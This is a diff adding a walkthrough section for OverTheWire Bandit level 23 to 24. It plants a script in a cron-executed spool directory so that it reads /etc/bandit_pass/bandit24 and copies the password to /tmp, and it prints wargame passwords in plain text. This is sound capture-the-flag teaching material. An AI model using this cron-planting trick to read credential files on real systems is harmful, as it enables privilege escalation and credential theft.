@@ -569,3 +569,80 @@ Using the generated file name one can then obtain the password:
 cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 ```
+
+## Bandit 23 > 24
+
+This level involves creating a script that will be scheduled to run using a cron job.
+
+```bash
+ ls /etc/cron.d/
+cronjob_bandit22  cronjob_bandit24  otw-tmp-dir
+cronjob_bandit23  e2scrub_all       sysstat
+```
+
+we see that there is a cronjob for bandit24
+
+Printing its contents result in:
+
+```bash
+cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+Below we see that the cron checks for any scripts written by user 23, runs the them then deletes the scripts.
+
+```bash
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+we'll create a script that the cron we'll run to obtain the password and the file to save the password.
+
+```bash
+mkdir /tmp/rand
+touch password
+```
+
+```bash
+bandit23@bandit:~$ cd /tmp/rand
+bandit23@bandit:/tmp/rand$ nano script.sh
+```
+
+The script:
+```nano
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/rand/password
+```
+
+We then copy the script to where the cron job is:
+
+
+```bash
+cp script.sh /var/spool/bandit24/foo
+```
+
+We then wait for about a minute or so for the script to be executed and the password directed to `password`
+
+
+```bash
+bandit23@bandit:/tmp/rand$ cat password
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
